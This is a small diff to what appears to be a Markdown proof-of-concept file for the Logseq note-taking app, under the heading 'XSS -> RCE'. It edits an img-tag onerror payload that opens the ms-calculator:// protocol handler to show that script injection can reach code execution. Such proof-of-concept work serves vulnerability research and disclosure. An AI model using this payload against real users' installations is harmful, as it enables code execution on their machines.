@@ -11,7 +11,7 @@ Hello there Logseq!
 ---
 ## XSS -> RCE
 
-<img src=x onerror="window.top.location='ms-calculator://'">
+<img src=x onerror="window.location='ms-calculator://'">
 
 ---
 
